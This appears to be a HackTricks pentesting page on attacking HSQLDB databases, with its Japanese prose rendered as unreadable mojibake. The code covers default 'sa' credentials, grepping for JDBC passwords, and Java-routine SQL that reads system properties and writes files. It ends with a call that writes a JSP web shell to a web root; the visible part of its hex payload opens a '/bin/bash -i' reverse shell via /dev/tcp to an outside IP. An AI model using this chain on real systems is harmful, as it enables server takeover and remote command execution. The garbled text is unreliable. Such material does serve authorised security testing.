{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}


# åŸºæœ¬æƒ…å ±

**HSQLDB \([HyperSQL DataBase](http://hsqldb.org/)\)** ã¯ã€Javaã§æ›¸ã‹ã‚ŒãŸä¸»è¦ãªSQLãƒªãƒ¬ãƒ¼ã‚·ãƒ§ãƒŠãƒ«ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã‚·ã‚¹ãƒ†ãƒ ã§ã™ã€‚å°å‹ã§é«˜é€Ÿãªãƒãƒ«ãƒã‚¹ãƒ¬ãƒƒãƒ‰ãŠã‚ˆã³ãƒˆãƒ©ãƒ³ã‚¶ã‚¯ã‚·ãƒ§ãƒŠãƒ«ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã‚¨ãƒ³ã‚¸ãƒ³ã‚’æä¾›ã—ã€ãƒ¡ãƒ¢ãƒªå†…ãŠã‚ˆã³ãƒ‡ã‚£ã‚¹ã‚¯ãƒ™ãƒ¼ã‚¹ã®ãƒ†ãƒ¼ãƒ–ãƒ«ã‚’ã‚µãƒãƒ¼ãƒˆã—ã€åŸ‹ã‚è¾¼ã¿ãƒ¢ãƒ¼ãƒ‰ã¨ã‚µãƒ¼ãƒãƒ¼ãƒ¢ãƒ¼ãƒ‰ã‚’ã‚µãƒãƒ¼ãƒˆã—ã¦ã„ã¾ã™ã€‚

**ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆãƒãƒ¼ãƒˆ:** 9001
```text
9001/tcp open  jdbc      HSQLDB JDBC (Network Compatibility Version 2.3.4.0)
```
# æƒ…å ±

### ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆè¨­å®š

ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã¯ã€ã“ã®ã‚µãƒ¼ãƒ“ã‚¹ã¯ãƒ¡ãƒ¢ãƒªå†…ã§å®Ÿè¡Œã•ã‚Œã¦ã„ã‚‹ã‹ã€localhostã«ãƒã‚¤ãƒ³ãƒ‰ã•ã‚Œã¦ã„ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚ã“ã‚Œã‚’è¦‹ã¤ã‘ãŸå ´åˆã€åˆ¥ã®ã‚µãƒ¼ãƒ“ã‚¹ã‚’æ‚ªç”¨ã—ã€ç‰¹æ¨©ã‚’æ˜‡æ ¼ã•ã›ã‚ˆã†ã¨ã—ã¦ã„ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã®èªè¨¼æƒ…å ±ã¯é€šå¸¸ã€`sa`ã¨ç©ºã®ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã§ã™ã€‚

åˆ¥ã®ã‚µãƒ¼ãƒ“ã‚¹ã‚’æ‚ªç”¨ã—ãŸå ´åˆã€å¯èƒ½ãªèªè¨¼æƒ…å ±ã‚’æ¤œç´¢ã—ã¦ãã ã•ã„ã€‚
```text
grep -rP 'jdbc:hsqldb.*password.*' /path/to/search
```
æ³¨æ„æ·±ããƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹åã‚’ç¢ºèªã—ã¦ãã ã•ã„ - æ¥ç¶šã™ã‚‹ãŸã‚ã«å¿…è¦ã§ã™ã€‚

# æƒ…å ±åé›†

[HSQLDB](https://sourceforge.net/projects/hsqldb/files/)ã‚’ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ã¦ã€`hsqldb/lib/hsqldb.jar`ã‚’æŠ½å‡ºã™ã‚‹ã“ã¨ã§DBã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã«æ¥ç¶šã—ã¾ã™ã€‚`java -jar hsqldb.jar`ã‚’ä½¿ç”¨ã—ã¦GUIã‚¢ãƒ—ãƒªã‚’å®Ÿè¡Œã—ã€ç™ºè¦‹ã—ãŸ/å¼±ã„è³‡æ ¼æƒ…å ±ã‚’ä½¿ç”¨ã—ã¦ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã«æ¥ç¶šã—ã¾ã™ã€‚

æ¥ç¶šURLã¯ãƒªãƒ¢ãƒ¼ãƒˆã‚·ã‚¹ãƒ†ãƒ ã®å ´åˆã€æ¬¡ã®ã‚ˆã†ã«ãªã‚Šã¾ã™: `jdbc:hsqldb:hsql://ip/DBNAME`ã€‚

# ãƒˆãƒªãƒƒã‚¯

## Javaè¨€èªãƒ«ãƒ¼ãƒãƒ³

HSQLDBã‹ã‚‰Javaè¨€èªãƒ«ãƒ¼ãƒãƒ³ã‚’ä½¿ç”¨ã—ã¦Javaã‚¯ãƒ©ã‚¹ã®é™çš„ãƒ¡ã‚½ãƒƒãƒ‰ã‚’å‘¼ã³å‡ºã™ã“ã¨ãŒã§ãã¾ã™ã€‚å‘¼ã³å‡ºã•ã‚Œã‚‹ã‚¯ãƒ©ã‚¹ã¯ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®ã‚¯ãƒ©ã‚¹ãƒ‘ã‚¹ã«å«ã¾ã‚Œã¦ã„ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚

JRTã¯`é–¢æ•°`ã¾ãŸã¯`æ‰‹ç¶šã`ã§ã™ã€‚é–¢æ•°ã¯ã€Javaãƒ¡ã‚½ãƒƒãƒ‰ãŒ1ã¤ä»¥ä¸Šã®SQLäº’æ›ã®ãƒ—ãƒªãƒŸãƒ†ã‚£ãƒ–å¤‰æ•°ã‚’è¿”ã™å ´åˆã€SQLæ–‡ã‚’ä»‹ã—ã¦å‘¼ã³å‡ºã™ã“ã¨ãŒã§ãã¾ã™ã€‚`VALUES`æ–‡ã‚’ä½¿ç”¨ã—ã¦å‘¼ã³å‡ºã•ã‚Œã¾ã™ã€‚

å‘¼ã³å‡ºã—ãŸã„Javaãƒ¡ã‚½ãƒƒãƒ‰ãŒvoidã‚’è¿”ã™å ´åˆã€`CALL`æ–‡ã‚’ä½¿ç”¨ã—ã¦å‘¼ã³å‡ºã•ã‚Œã‚‹æ‰‹ç¶šãã‚’ä½¿ç”¨ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚

## Javaã‚·ã‚¹ãƒ†ãƒ ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ã®èª­ã¿å–ã‚Š

é–¢æ•°ã‚’ä½œæˆ:
```text
CREATE FUNCTION getsystemproperty(IN key VARCHAR) RETURNS VARCHAR LANGUAGE JAVA
DETERMINISTIC NO SQL
EXTERNAL NAME 'CLASSPATH:java.lang.System.getProperty'
```
é–¢æ•°ã‚’å®Ÿè¡Œã™ã‚‹ï¼š
```text
VALUES(getsystemproperty('user.name'))
```
You can find a [list of system properties here](https://docs.oracle.com/javase/tutorial/essential/environment/sysprop.html).

## ãƒ•ã‚¡ã‚¤ãƒ«ã«ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã‚’æ›¸ã

`com.sun.org.apache.xml.internal.security.utils.JavaUtils.writeBytesToFilename` Javaã‚¬ã‚¸ã‚§ãƒƒãƒˆã‚’ä½¿ç”¨ã—ã¦ã€ã‚«ã‚¹ã‚¿ãƒ æ‰‹é †ã‚’ä»‹ã—ã¦16é€²ã‚¨ãƒ³ã‚³ãƒ¼ãƒ‰ã•ã‚ŒãŸã‚¢ã‚¤ãƒ†ãƒ ã‚’ãƒ‡ã‚£ã‚¹ã‚¯ã«æ›¸ãè¾¼ã‚€ã“ã¨ãŒã§ãã¾ã™ï¼ˆJDKã«ã‚ã‚Šã€ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®ã‚¯ãƒ©ã‚¹ãƒ‘ã‚¹ã«è‡ªå‹•çš„ã«ãƒ­ãƒ¼ãƒ‰ã•ã‚Œã¾ã™ï¼‰ã€‚**æœ€å¤§ã‚µã‚¤ã‚ºã¯1024ãƒã‚¤ãƒˆã§ã™**ã€‚

æ‰‹é †ã‚’ä½œæˆ:
```text
CREATE PROCEDURE writetofile(IN paramString VARCHAR, IN paramArrayOfByte VARBINARY(1024))
LANGUAGE JAVA DETERMINISTIC NO SQL EXTERNAL NAME
'CLASSPATH:com.sun.org.apache.xml.internal.security.utils.JavaUtils.writeBytesToFilename'
```
æ‰‹ç¶šãã‚’å®Ÿè¡Œã™ã‚‹ï¼š
```text
call writetofile('/path/ROOT/shell.jsp', cast ('3c2540207061676520696d706f72743d226a6176612e696f2e2a2220253e0a3c250a202020537472696e6720636d64203d20222f62696e2f62617368202d69203e26202f6465762f7463702f3139322e3136382e3131392[...]' AS VARBINARY(1024)))
```
{% hint style="success" %}
AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCPãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼
* **ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**ãƒ†ãƒ¬ã‚°ãƒ©ãƒ ã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€[**HackTricks**](https://github.com/carlospolop/hacktricks)ã¨[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’é€ä¿¡ã—ã¦ãã ã•ã„ã€‚**

</details>
{% endhint %}
